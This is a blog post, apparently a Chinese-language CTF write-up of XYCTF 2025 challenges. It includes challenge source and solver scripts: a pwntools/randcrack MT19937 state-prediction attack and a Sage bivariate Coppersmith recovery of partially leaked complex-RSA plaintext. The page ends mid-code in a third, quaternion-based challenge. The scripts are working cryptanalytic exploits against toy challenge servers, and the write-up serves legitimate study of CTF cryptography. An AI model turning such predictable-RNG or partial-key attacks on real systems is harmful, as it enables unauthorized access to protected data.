<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XYCTF 2025 部分题目Write Up | Triode Field</title><meta name="author" content="Triode"><meta name="copyright" content="Triode"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XYCTF 2025 部分题目Write Up，包括赛后复现的两道Crypto">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF 2025 部分题目Write Up">
<meta property="og:url" content="https://triodelzx.github.io/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/index.html">
<meta property="og:site_name" content="Triode Field">
<meta property="og:description" content="XYCTF 2025 部分题目Write Up，包括赛后复现的两道Crypto">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://triodelzx.github.io/img/512.png">
<meta property="article:published_time" content="2025-04-10T13:11:11.000Z">
<meta property="article:modified_time" content="2025-04-10T13:38:35.764Z">
<meta property="article:author" content="Triode">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Reverse">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://triodelzx.github.io/img/512.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://triodelzx.github.io/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XYCTF 2025 部分题目Write Up',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-04-10 21:38:35'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Triode Field" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/512.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Triode Field"><span class="site-name">Triode Field</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XYCTF 2025 部分题目Write Up</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-10T13:11:11.000Z" title="Created 2025-04-10 21:11:11">2025-04-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-10T13:38:35.764Z" title="Updated 2025-04-10 21:38:35">2025-04-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Write-up/">Write up</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XYCTF 2025 部分题目Write Up"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年明明说以后都不打这比赛的，今年还是来打了_(:3 」∠ )_</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">menu:  </span></span><br><span class="line"><span class="string">      [1]  Division calc      </span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)  </span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)  </span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)  </span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)  </span><br><span class="line">            correct_ans = rand1 // rand2  </span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)  </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>MT19937随机数状态预测，分母全部传个1就可以直接得到生成的随机数，由此获取624个状态再预测就可以了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>, port)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_state</span>():  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;= &#x27;</span>)  </span><br><span class="line">    st = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(st)  </span><br><span class="line">  </span><br><span class="line">rc = RandCrack()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">624</span>):  </span><br><span class="line">    state = get_state()  </span><br><span class="line">    rc.submit(state)  </span><br><span class="line">  </span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)  </span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;: &gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(rand1 // rand2).encode())  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20  </span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):  </span><br><span class="line">        self.re = re  </span><br><span class="line">        self.im = im  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):  </span><br><span class="line">        re_ = self.re * c.re - self.im * c.im  </span><br><span class="line">        im_ = self.re * c.im + self.im * c.re  </span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):  </span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):  </span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):  </span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)  </span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:  </span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):  </span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)  </span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:  </span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:  </span><br><span class="line">            result = result * c  </span><br><span class="line">            result.re = result.re % n  </span><br><span class="line">            result.im = result.im % n  </span><br><span class="line">        c = c * c  </span><br><span class="line">        c.re = c.re % n  </span><br><span class="line">        c.im = c.im % n  </span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">return</span> result  </span><br><span class="line">  </span><br><span class="line">bits = <span class="number">128</span>  </span><br><span class="line">p = getPrime(<span class="number">1024</span>)  </span><br><span class="line">q = getPrime(<span class="number">1024</span>)  </span><br><span class="line">n = p * q  </span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))  </span><br><span class="line">e = <span class="number">3</span>  </span><br><span class="line">c = complex_pow(m, e, n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">n = ...  </span></span><br><span class="line"><span class="string">mh = [..., ...]  </span></span><br><span class="line"><span class="string">C = [..., ...]  </span></span><br><span class="line"><span class="string">enc = ... </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>复数RSA，而且泄露了明文高位，对于明文$m$，可知：</p>
<script type="math/tex; mode=display">
C=m^3=[Re(m)+i\cdot Im(m)]^3=[Re(m)^3 - 3Re(m)Im(m)^2] + i[3Re(m)^2Im(m) - Im(m)^3]</script><p>在这里已知$Re(m)$以及$Im(m)$的高1920位，所以我们可以通过二元coppersmith来还原低位，在这里仅使用密文的实部（实际上用虚部也是可以的），可以构造得到多项式：</p>
<script type="math/tex; mode=display">
f=(mh_0+x)^3-3(mh_0+x)(mh_1+y)^2-Re(C)</script><p>上式中$mh_0,mh_1$对应题目给出数据中的<code>mh[0],mh[1]</code>，通过下述代码就可以得到flag了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficients_monomials()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = ...</span><br><span class="line">mh = [..., ...]</span><br><span class="line">C = [..., ...]</span><br><span class="line">enc = ...</span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">R.&lt;x, y&gt; = Zmod(n)[]</span><br><span class="line"></span><br><span class="line">re_m = mh[<span class="number">0</span>] + x</span><br><span class="line">im_m = mh[<span class="number">1</span>] + y</span><br><span class="line"></span><br><span class="line">f = re_m^<span class="number">3</span> - <span class="number">3</span>*re_m*im_m^<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">a, b = small_roots(f, bounds=(<span class="number">2</span>^bits, <span class="number">2</span>^bits), m=<span class="number">1</span>, d=<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(mh[<span class="number">0</span>] + mh[<span class="number">1</span>] + ZZ(a) + ZZ(b)).encode()).digest()</span><br><span class="line"></span><br><span class="line">cipher = ChaCha20.new(key=key, nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plaintext = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(plaintext.decode())</span><br></pre></td></tr></table></figure></p>
<h3 id="复复复复数"><a href="#复复复复数" class="headerlink" title="复复复复数"></a>复复复复数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ComComplex</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span>):  </span><br><span class="line">        self.value = value  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):  </span><br><span class="line">        s = <span class="built_in">str</span>(self.value[<span class="number">0</span>])  </span><br><span class="line">        <span class="keyword">for</span> k,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.value[<span class="number">1</span>:]):  </span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">0</span>:  </span><br><span class="line">                s += <span class="string">&#x27;+&#x27;</span>  </span><br><span class="line">            s += <span class="built_in">str</span>(i) +<span class="string">&#x27;ijk&#x27;</span>[k]  </span><br><span class="line">        <span class="keyword">return</span> s  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([i+j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(self.value,x.value)])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        a = self.value[<span class="number">0</span>]*x.value[<span class="number">0</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">1</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">3</span>]  </span><br><span class="line">        b = self.value[<span class="number">0</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">3</span>]-self.value[<span class="number">3</span>]*x.value[<span class="number">2</span>]  </span><br><span class="line">        c = self.value[<span class="number">0</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">1</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">2</span>]*x.value[<span class="number">0</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">1</span>]  </span><br><span class="line">        d = self.value[<span class="number">0</span>]*x.value[<span class="number">3</span>]+self.value[<span class="number">1</span>]*x.value[<span class="number">2</span>]-self.value[<span class="number">2</span>]*x.value[<span class="number">1</span>]+self.value[<span class="number">3</span>]*x.value[<span class="number">0</span>]  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([a,b,c,d])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mod__</span>(<span class="params">self,x</span>):  </span><br><span class="line">        <span class="keyword">return</span> ComComplex([i % x <span class="keyword">for</span> i <span class="keyword">in</span> self.value])  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, x, n=<span class="literal">None</span></span>):  </span><br><span class="line">        tmp = ComComplex(self.value)  </span><br><span class="line">        a = ComComplex([<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])  </span><br><span class="line">        <span class="keyword">while</span> x:  </span><br><span class="line">            <span class="keyword">if</span> x &amp; <span class="number">1</span>:  </span><br><span class="line">                a *= tmp  </span><br><span class="line">            tmp *= tmp  </span><br><span class="line">            <span class="keyword">if</span> n:  </span><br><span class="line">                a %= n  </span><br><span class="line">                tmp %= n  </span><br><span class="line">            x &gt;&gt;= <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">return</span> a  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint  </span><br><span class="line">  </span><br><span class="line">p = getPrime(<span class="number">256</span>)  </span><br><span class="line">q = getPrime(<span class="number">256</span>)  </span><br><span class="line">r = getPrime(<span class="number">256</span>)  </span><br><span class="line">n = p * q * r  </span><br><span class="line">  </span><br><span class="line">P = getPrime(<span class="number">512</span>)  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(hint) == <span class="number">20</span>  </span><br><span class="line">hints = ComComplex([bytes_to_long(hint[i:i+<span class="number">5</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>,<span class="number">5</span>)])  </span><br><span class="line">keys = ComComplex([<span class="number">0</span>, p, q, r])  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>,hints)  </span><br><span class="line"><span 